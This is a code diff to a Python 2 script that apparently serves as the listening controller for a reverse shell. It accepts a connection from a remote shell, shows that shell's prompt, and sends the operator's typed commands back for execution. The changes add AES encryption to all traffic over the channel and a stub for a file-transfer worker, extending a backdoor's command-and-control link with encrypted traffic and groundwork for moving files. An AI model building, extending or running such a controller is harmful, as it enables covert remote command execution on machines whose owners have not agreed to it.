@@ -61,13 +61,13 @@ def get_client():
 
 comm_socket, addr = get_client()
 comm_socket.setblocking(1)
-sys.stdout.write(comm_socket.recv(4096)[:-1]) # Receive current directory and prompt
+sys.stdout.write(DecodeAES(comm_socket.recv(4096))[:-1]) # Receive current directory and prompt
 
 output_queue = Queue.Queue()
 
-class MessageHandler: # Base class for adding a message handler
+class MessageWorker: # Base class for adding a message worker
 	def __init__(self, data_prefix):
-		self.data_prefix = data_prefix # Prefix used to identify to which handler data should be sent
+		self.data_prefix = data_prefix # Prefix used to identify to which worker data should be sent
 		self.input_queue = Queue.Queue() # Queue of data to process
 		
 	def send(self, data):
@@ -79,7 +79,7 @@ class MessageHandler: # Base class for adding a message handler
 	def run(self):
 		pass
 		
-class UserInputHandler(MessageHandler): # Handler which takes user input and sends it for execution
+class UserInputWorker(MessageWorker): # Worker which takes user input and sends it for execution
 
 	def run(self):
 		try:
@@ -90,30 +90,35 @@ class UserInputHandler(MessageHandler): # Handler which takes user input and sen
 		except EOFError: # Exit when user presses Control-C
 			os._exit(0)
 			
-class TransmitHandler(MessageHandler): # Pseudo-handler to send data to shell
+class FileTransferWorker(MessageWorker):
+
+	def run(self):
+		pass
+			
+class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
 	def run(self):
 		while True:
-			comm_socket.sendall(output_queue.get())	
+			comm_socket.sendall(EncodeAES(output_queue.get()))	
 			
-handlers = []
-user_input_handler = UserInputHandler(chr(1))
-transmit_handler = TransmitHandler(chr(0)) # Create handlers
-handlers.append(user_input_handler)
-handlers.append(transmit_handler)
+workers = []
+user_input_worker = UserInputWorker(chr(1))
+transmit_worker = TransmitWorker(chr(0)) # Create workers
+workers.append(user_input_worker)
+workers.append(transmit_worker)
 
-for handler in handlers: # Start handlers
-	t = threading.Thread(target=handler.run)
+for worker in workers: # Start workers
+	t = threading.Thread(target=worker.run)
 	t.daemon = True
 	t.start()
 
 while True:
 	data = ""
 	while not data.endswith(marker):
-		data += comm_socket.recv(4096)
+		data += DecodeAES(comm_socket.recv(4096))
 	if not data: break
 	data = data[:-1] # Get data from shell and remove marker
 	
-	for handler in handlers:
-		if handler.data_prefix == data[0]: # Put data on correct handler's queue
-			handler.put(data[1:])
+	for worker in workers:
+		if worker.data_prefix == data[0]: # Put data on correct worker's queue
+			worker.put(data[1:])
 			break
